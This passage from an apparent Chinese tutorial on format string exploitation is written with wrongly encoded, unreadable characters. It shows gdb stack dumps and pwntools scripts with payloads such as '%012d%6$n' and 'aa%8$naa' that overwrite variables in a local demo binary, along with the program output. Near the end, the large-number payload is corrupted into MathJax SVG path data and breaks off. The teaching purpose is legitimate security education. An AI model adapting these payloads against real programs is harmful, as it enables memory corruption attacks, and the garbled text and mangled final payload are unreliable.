<p>makefileåœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸­ã€‚è€Œæ— è®ºæ˜¯è¦†ç›–å“ªä¸ªåœ°å€çš„å˜é‡ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šéƒ½æ˜¯æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­â€¦è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œoverwrite addr è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œoverwrite offsetåœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œä¹Ÿæ˜¯å¦‚ä¸‹æ­¥éª¤</p>
<ul>
<li>ç¡®å®šè¦†ç›–åœ°å€</li>
<li>ç¡®å®šç›¸å¯¹åç§»</li>
<li>è¿›è¡Œè¦†ç›–</li>
</ul>
<h3 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h3><h4 id="ç¡®å®šè¦†ç›–åœ°å€"><a href="#ç¡®å®šè¦†ç›–åœ°å€" class="headerlink" title="ç¡®å®šè¦†ç›–åœ°å€"></a>ç¡®å®šè¦†ç›–åœ°å€</h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬è‡ªç„¶æ˜¯æ¥æƒ³åŠæ³•çŸ¥é“æ ˆå˜é‡cçš„åœ°å€ã€‚ç”±äºç›®å‰å‡ ä¹ä¸Šæ‰€æœ‰çš„ç¨‹åºéƒ½å¼€å¯äº†aslrä¿æŠ¤ï¼Œæ‰€ä»¥æ ˆçš„åœ°å€ä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ•…æ„è¾“å‡ºäº†cå˜é‡çš„åœ°å€ã€‚</p>
<h4 id="ç¡®å®šç›¸å¯¹åç§»"><a href="#ç¡®å®šç›¸å¯¹åç§»" class="headerlink" title="ç¡®å®šç›¸å¯¹åç§»"></a>ç¡®å®šç›¸å¯¹åç§»</h4><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬æ¥ç¡®å®šä¸€ä¸‹å­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€æ˜¯printfå°†è¦è¾“å‡ºçš„ç¬¬å‡ ä¸ªå‚æ•°()ã€‚ è¿™é‡Œæˆ‘ä»¬é€šè¿‡ä¹‹å‰çš„æ³„éœ²æ ˆå˜é‡æ•°å€¼çš„æ–¹æ³•æ¥è¿›è¡Œæ“ä½œã€‚é€šè¿‡è°ƒè¯•</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0câ”‚+0x00: 0x080484d7  â†’  &lt;main+76&gt; add esp, 0x10	 â† $esp<br>0xffffcd10â”‚+0x04: 0xffffcd28  â†’  &quot;%d%d&quot;<br>0xffffcd14â”‚+0x08: 0xffffcd8c  â†’  0x00000315<br>0xffffcd18â”‚+0x0c: 0x000000c2<br>0xffffcd1câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20â”‚+0x14: 0xffffcd4e  â†’  0xffff0000  â†’  0x00000000<br>0xffffcd24â”‚+0x18: 0xffffce4c  â†’  0xffffd07a  â†’  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28â”‚+0x1c: &quot;%d%d&quot;	 â† $eax<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨0xffffcd14å¤„å­˜å‚¨ç€å˜é‡cçš„æ•°å€¼ã€‚ç»§è€Œï¼Œæˆ‘ä»¬å†ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²â€™%d%dâ€™çš„åœ°å€0xffffcd28ç›¸å¯¹äºprintfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°0xffffcd10çš„åç§»ä¸º0x18ï¼Œå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å½“äºprintfå‡½æ•°çš„ç¬¬7ä¸ªå‚æ•°ï¼Œç›¸å½“äºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ã€‚</p>
<h4 id="è¿›è¡Œè¦†ç›–"><a href="#è¿›è¡Œè¦†ç›–" class="headerlink" title="è¿›è¡Œè¦†ç›–"></a>è¿›è¡Œè¦†ç›–</h4><p>è¿™æ ·ï¼Œç¬¬6ä¸ªå‚æ•°å¤„çš„å€¼å°±æ˜¯å­˜å‚¨å˜é‡cçš„åœ°å€ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨%nçš„ç‰¹å¾æ¥ä¿®æ”¹cçš„å€¼ã€‚payloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[addr of c]%012d%6$n<br></code></pre></td></tr></table></figure>

<p>addr of c çš„é•¿åº¦ä¸º4ï¼Œæ•…è€Œæˆ‘ä»¬å¾—å†è¾“å…¥12ä¸ªå­—ç¬¦æ‰å¯ä»¥è¾¾åˆ°16ä¸ªå­—ç¬¦ï¼Œä»¥ä¾¿äºæ¥ä¿®æ”¹cçš„å€¼ä¸º16ã€‚</p>
<p>å…·ä½“è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forc</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>    payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-comment">#gdb.attach(sh)</span><br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  overwrite git:(master) âœ— python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>ÜŒï¿½ï¿½%012d%6$n<br>ÜŒï¿½ï¿½-00000160648modified c.<br></code></pre></td></tr></table></figure>

<h3 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h3><h4 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥è€ƒè™‘ä¸€ä¸‹å¦‚ä½•ä¿®æ”¹dataæ®µçš„å˜é‡ä¸ºä¸€ä¸ªè¾ƒå°çš„æ•°å­—ï¼Œæ¯”å¦‚è¯´ï¼Œ<strong>å°äºæœºå™¨å­—é•¿çš„æ•°å­—</strong>ã€‚è¿™é‡Œä»¥2ä¸ºä¾‹ã€‚å¯èƒ½ä¼šè§‰å¾—è¿™å…¶å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå¯ä»”ç»†ä¸€æƒ³ï¼ŒçœŸçš„æ²¡æœ‰ä¹ˆï¼Ÿå¦‚æœæˆ‘ä»¬è¿˜æ˜¯å°†è¦è¦†ç›–çš„åœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œé‚£ä¹ˆå°†ç›´æ¥å ç”¨æœºå™¨å­—é•¿ä¸ª(4æˆ–8)å­—èŠ‚ã€‚æ˜¾ç„¶ï¼Œæ— è®ºä¹‹åå¦‚ä½•è¾“å‡ºï¼Œéƒ½åªä¼šæ¯”4å¤§ã€‚</p>
<blockquote>
<p>æˆ–è®¸æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•´å½¢æº¢å‡ºæ¥ä¿®æ”¹å¯¹åº”çš„åœ°å€çš„å€¼ï¼Œä½†æ˜¯è¿™æ ·å°†é¢ä¸´ç€æˆ‘ä»¬å¾—ä¸€æ¬¡è¾“å‡ºå¤§é‡çš„å†…å®¹ã€‚è€Œè¿™ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒåŸºæœ¬éƒ½ä¸ä¼šæ”»å‡»æˆåŠŸã€‚</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿå†ä»”ç»†æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å°†æ‰€è¦è¦†ç›–çš„å˜é‡çš„åœ°å€æ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰é¢ä¹ˆï¼Ÿä¼¼ä¹æ²¡æœ‰ï¼Œæˆ‘ä»¬å½“æ—¶åªæ˜¯ä¸ºäº†å¯»æ‰¾åç§»ï¼Œæ‰€ä»¥æ‰æŠŠtagæ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰é¢ï¼Œå¦‚æœæˆ‘ä»¬æŠŠtagæ”¾åœ¨ä¸­é—´ï¼Œå…¶å®ä¹Ÿæ˜¯æ— å¦¨çš„ã€‚ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬æŠŠåœ°å€æ”¾åœ¨ä¸­é—´ï¼Œåªè¦èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„åç§»ï¼Œå…¶ç…§æ ·ä¹Ÿå¯ä»¥å¾—åˆ°å¯¹åº”çš„æ•°å€¼ã€‚å‰é¢å·²ç»è¯´äº†æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸ºç¬¬6ä¸ªå‚æ•°ã€‚ç”±äºæˆ‘ä»¬æƒ³è¦æŠŠ2å†™åˆ°å¯¹åº”çš„åœ°å€å¤„ï¼Œæ•…è€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰é¢çš„å­—èŠ‚å¿…é¡»æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">aa%k$nxx<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¯¹åº”çš„å­˜å‚¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å·²ç»å æ®äº†6ä¸ªå­—ç¬¦çš„ä½ç½®ï¼Œå¦‚æœæˆ‘ä»¬å†æ·»åŠ ä¸¤ä¸ªå­—ç¬¦aaï¼Œé‚£ä¹ˆå…¶å®aa%kå°±æ˜¯ç¬¬6ä¸ªå‚æ•°ï¼Œ$nxxå…¶å®å°±æ˜¯ç¬¬7ä¸ªå‚æ•°ï¼Œåé¢æˆ‘ä»¬å¦‚æœè·Ÿä¸Šæˆ‘ä»¬è¦è¦†ç›–çš„åœ°å€ï¼Œé‚£å°±æ˜¯ç¬¬8ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¿™é‡Œè®¾ç½®kä¸º8ï¼Œå…¶å®å°±å¯ä»¥è¦†ç›–äº†ã€‚</p>
<p>åˆ©ç”¨idaå¯ä»¥å¾—åˆ°açš„åœ°å€ä¸º0x0804A024ï¼ˆç”±äºaã€bæ˜¯å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œå› æ­¤ä¸åœ¨å †æ ˆä¸­ï¼‰ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure>

<p>æ•…è€Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„åˆ©ç”¨ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fora</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    a_addr = <span class="hljs-number">0x0804A024</span><br>    payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>å¯¹åº”çš„ç»“æœå¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  overwrite git:(master) âœ— python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta">aaaa$</span><span class="bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure>

<p>å…¶å®ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æŒæ¡çš„å°æŠ€å·§å°±æ˜¯ï¼Œæˆ‘ä»¬æ²¡æœ‰å¿…è¦å¿…é¡»æŠŠåœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œæ”¾åœ¨é‚£é‡Œéƒ½å¯ä»¥ï¼Œåªè¦æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…¶å¯¹åº”çš„åç§»å³å¯ã€‚</p>
<h4 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h4><p>ä¸Šé¢ä»‹ç»äº†è¦†ç›–å°æ•°å­—ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å°‘è¦†ç›–å¤§æ•°å­—äº†ã€‚ä¸Šé¢æˆ‘ä»¬ä¹Ÿè¯´äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥ä¸€æ¬¡æ€§è¾“å‡ºå¤§æ•°å­—ä¸ªå­—èŠ‚æ¥è¿›è¡Œè¦†ç›–ï¼Œä½†æ˜¯è¿™æ ·åŸºæœ¬ä¹Ÿä¸ä¼šæˆåŠŸï¼Œå› ä¸ºå¤ªé•¿äº†ã€‚è€Œä¸”å³ä½¿æˆåŠŸï¼Œæˆ‘ä»¬ä¸€æ¬¡æ€§ç­‰å¾…çš„æ—¶é—´ä¹Ÿå¤ªé•¿äº†ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆæ¯”è¾ƒå¥½çš„æ–¹å¼å‘¢ï¼Ÿè‡ªç„¶æ˜¯æœ‰äº†ã€‚</p>
<p>ä¸è¿‡åœ¨ä»‹ç»ä¹‹å‰ï¼Œæˆ‘ä»¬å¾—å…ˆå†ç®€å•äº†è§£ä¸€ä¸‹ï¼Œå˜é‡åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ ¼å¼ã€‚é¦–å…ˆï¼Œæ‰€æœ‰çš„å˜é‡åœ¨å†…å­˜ä¸­éƒ½æ˜¯ä»¥å­—èŠ‚è¿›è¡Œå­˜å‚¨çš„ã€‚æ­¤å¤–ï¼Œåœ¨x86å’Œx64çš„ä½“ç³»ç»“æ„ä¸­ï¼Œå˜é‡çš„å­˜å‚¨æ ¼å¼ä¸ºä»¥å°ç«¯å­˜å‚¨ï¼Œå³æœ€ä½æœ‰æ•ˆä½å­˜å‚¨åœ¨ä½åœ°å€ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ0x12345678åœ¨å†…å­˜ä¸­ç”±ä½åœ°å€åˆ°é«˜åœ°å€ä¾æ¬¡ä¸º\x78\x56\x34\x12ã€‚å†è€…ï¼Œæˆ‘ä»¬å¯ä»¥å›å¿†ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„æ ‡å¿—ï¼Œå¯ä»¥å‘ç°æœ‰è¿™ä¹ˆä¸¤ä¸ªæ ‡å¿—ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text"> <br> hh å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»charæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚<br>h  å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»shortæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨%hhnå‘æŸä¸ªåœ°å€å†™å…¥å•å­—èŠ‚ï¼Œåˆ©ç”¨%hnå‘æŸä¸ªåœ°å€å†™å…¥åŒå­—èŠ‚ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä»¥å•å­—èŠ‚ä¸ºä¾‹ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦ç¡®å®šçš„æ˜¯è¦è¦†ç›–çš„åœ°å€ä¸ºå¤šå°‘ï¼Œåˆ©ç”¨idaçœ‹ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°åœ°å€ä¸º0x0804A028ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure>

<p>å³æˆ‘ä»¬å¸Œæœ›å°†æŒ‰ç…§å¦‚ä¸‹æ–¹å¼è¿›è¡Œè¦†ç›–ï¼Œå‰é¢ä¸ºè¦†ç›–åœ°å€ï¼Œåé¢ä¸ºè¦†ç›–å†…å®¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆï¼Œç”±äºæˆ‘ä»¬çš„å­—ç¬¦ä¸²çš„åç§»ä¸º6ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®å®šæˆ‘ä»¬çš„payloadåŸºæœ¬æ˜¯è¿™ä¸ªæ ·å­çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad2+'%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-32" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;+pad3+&#x27;%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad4+'%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
